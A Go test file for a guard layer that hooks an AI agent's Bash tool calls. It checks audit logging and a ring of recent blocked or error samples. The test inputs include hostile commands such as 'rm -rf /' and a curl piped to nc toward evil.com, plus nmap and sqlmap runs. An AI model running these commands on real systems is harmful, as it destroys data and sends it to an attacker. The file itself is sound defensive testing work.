package guard

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

// B6: postToolUse keeps a per-class ring of the most recent blocked/error samples
// (command truncated), while counts stay exact. ok results produce no samples.
func TestAttributionSampleRing(t *testing.T) {
	g := New()
	post := func(cmd, result string, isErr bool) {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		g.Hooks().PostToolUse(context.Background(), "Bash", input, []byte(result), isErr)
	}

	// ok calls must not land in samples (memory discipline), only the count
	post("ls -la", "ok", false)
	post("whoami", "ok", false)

	// 5 blocked → ring capped at 3, count = 5
	for i := 0; i < 5; i++ {
		post(fmt.Sprintf("curl http://t%d.acme.dev", i), "HTTP 403 forbidden by WAF", false)
	}
	// 2 errors → ring has error:2, count = 2
	post("nmap -p1-65535 10.0.0.1", "scan exited with code 2", true)
	post("sqlmap -u http://t.acme.dev", "error: connection refused", true)

	stats := g.AttributionStats()
	counts, _ := stats["blocked"].(int)
	if counts != 5 {
		t.Errorf("blocked count = %d, want 5", counts)
	}
	if errN, _ := stats["error"].(int); errN != 2 {
		t.Errorf("error count = %d, want 2", errN)
	}
	if okN, _ := stats["ok"].(int); okN != 2 {
		t.Errorf("ok count = %d, want 2", okN)
	}
	bl, _ := stats["samples"].(map[string]any)
	blocked, _ := bl["blocked"].([]AttribSample)
	if len(blocked) != attribSampleMax {
		t.Fatalf("blocked samples = %d, want %d", len(blocked), attribSampleMax)
	}
	// ring keeps the LATEST: t2/t3/t4 must be present, t0/t1 dropped
	if last := blocked[len(blocked)-1].Command; last[:len("curl http://t")] != "curl http://t" || !strings.HasSuffix(last, "t4.acme.dev") {
		t.Errorf("newest blocked sample should be t4, got %q", last)
	}
	for _, s := range blocked {
		if len(s.Command) > attribSampleMaxBytes {
			t.Errorf("sample command not truncated: %d bytes", len(s.Command))
		}
	}
	noSamples, _ := bl["ok"].([]AttribSample)
	if len(noSamples) != 0 {
		t.Errorf("ok class should keep no samples, got %d", len(noSamples))
	}
}

var _ = hook.PreToolUse
